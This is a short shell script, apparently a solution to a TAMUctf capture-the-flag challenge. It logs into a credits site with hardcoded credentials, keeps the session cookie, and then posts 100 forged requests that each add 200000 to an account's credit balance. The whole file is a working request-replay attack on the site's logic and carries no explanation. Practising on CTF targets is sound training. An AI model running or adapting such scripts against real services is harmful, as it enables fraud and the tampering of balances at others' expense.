#!/bin/sh

curl -c cookies.txt --data "username=ravich&&password=password" http://credits.tamuctf.com/login

i=0
for i in {1..100};
do
    curl -b cookies.txt --data "increment=200000" http://credits.tamuctf.com/newcredit
done